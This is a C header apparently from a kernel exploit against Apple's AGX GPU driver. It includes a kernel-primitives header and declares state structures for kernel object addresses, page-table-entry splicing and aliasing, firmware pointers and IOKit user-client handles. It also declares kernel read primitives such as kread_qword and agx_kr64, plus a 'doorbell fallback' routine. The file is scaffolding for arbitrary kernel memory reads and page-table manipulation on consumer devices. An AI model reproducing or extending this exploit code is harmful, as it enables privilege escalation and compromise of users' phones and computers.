#ifndef AGX_INTERNAL_H
#define AGX_INTERNAL_H
#include <stdint.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include "kernel_primitives.h"
#ifdef __OBJC__
#import <Metal/Metal.h>
#endif

extern vm_size_t vm_page_size;

#ifndef AGX_KPTR_STRIP
#define AGX_KPTR_STRIP(v) (((v) & 0x0080000000000000ULL) ? ((v) | 0xFFFFFF8000000000ULL) : (v))
#endif

#ifndef AGX_DOORBELL_FALLBACK
#define AGX_DOORBELL_FALLBACK 0
#endif

typedef struct {
    uint32_t v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52, v53;
    uint64_t v27;
    int have[14];
} agx_runtime_offsets_t;

typedef struct {
    uint64_t kobj;
    uint64_t step1;
    uint64_t v299;
    uint64_t v298;
    uint64_t v297;
    uint64_t v296;
    uint64_t v295;
    uint64_t v294;
    uint64_t buf1_kva;
    uint64_t buf2_kva;
    uint64_t buf1_pa;
    uint64_t buf2_pa;
    ppl_page_t buf1_map;
    ppl_page_t buf2_map;
} agx_walk_t;

typedef struct {
    uint64_t   firmware_pa;
    uint64_t   firmware_pa_kva;
    uint64_t   firmware_v48_7;
    uint64_t   firmware_post_qw;
    uint64_t   firmware_kptr_mask;
    uint64_t   firmware_vaddr;
    uint64_t   firmware_kva_off;
    uint64_t   firmware_func_size;
    uint64_t   clone_user_va;
    uint64_t   clone_size;
    ppl_page_t *page_maps;
    long       page_count;
    uint64_t   ptr_post_qw_val;
    uint64_t   ptr_post_qw_pa;
    uint64_t   ptr_v48_7_val;
    uint64_t   ptr_v48_7_pa;
    uint64_t   v43;
    uint64_t   v44_kva;
    uint64_t   v45_kva;
    uint64_t   v46_kva;
    uint64_t   zero_kva;
    uint64_t   v51_kva;
    uint64_t   v52_val;
    uint64_t   v53_kva;
    uint64_t   v54_kva;
    uint64_t   v47_base;
    uint64_t   v49_const;
    uint64_t   v50_const;
    uint64_t   zero_wp_mapped_va;
    uint64_t   zero_wp_kva;
    uint64_t   zero_wp_page_size;
    ppl_page_t zero_wp_page;
    uint64_t   base_wp_mapped_va;
    uint64_t   base_wp_kva;
    uint64_t   base_wp_page_size;
    ppl_page_t base_wp_page;
    uint64_t   kobj1_kva;
    uint64_t   kobj1_pa;
    uint64_t   kobj2_kva;
    uint64_t   kobj2_pa;
    uint64_t   kobj3_kva;
    uint64_t   kobj3_leaf_pte_kva;
    uint64_t   kobj3_leaf_pte_val;
    uint64_t   kobj3_meta_pte_val;
    uint64_t   kobj4_kva;
    uint64_t   kobj4_leaf_pte_kva;
    uint64_t   kobj4_meta_pte_pa;
    uint64_t   s11_kobj1_pa;
    uint64_t   s11_kobj1_kva;
    uint64_t   s11_kobj2_kva;
    uint64_t   s11_v274_const;
    uint64_t   s11_k3_leaf_pte_kva;
    uint64_t   s11_k3_aliased_kva;
    uint64_t   s11_k3_pte_spliced;
    uint64_t   s11_k4_pte_offset_in_k3;
    uint64_t   s11_k4_kva_copy;
    uint64_t   s12_desc_base_user_va;
    uint64_t   s12_desc_base_kva;
    uint64_t   s12_v240_kread_ptr;
    uint64_t   s12_lobyte_off;
    uint32_t   s13_uc_connect;
    uint32_t   s13_sel7_handle;
    uint32_t   s13_selD0_handle;
    uint32_t   s13_selD1_handle;
} agx_fw_state_t;

extern agx_runtime_offsets_t g_agx_off;
extern agx_walk_t      g_agx_walk;
extern agx_fw_state_t        g_agx_fw;

static inline int agx_kva_ok(uint64_t v) {
    return v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFFFFFFFF0000ULL;
}

int  kread_qword(uint64_t kva, uint64_t *out);
int  kread_ptr_by_firmware_vaddr(uint64_t target_vaddr, uint64_t *out_ptr);
int  agx_kr64(uint64_t kva, uint64_t *out);
int  agx_kr64_dg(uint64_t kva, uint64_t *out);
int  agx_pg_unsafe(uint64_t pg);
int  kva_is_heap(uint64_t p);
int  agx_metal_setup(void);
void agx_metal_blits(int n);

int  agx_doorbell_fallback_run(void);

#endif
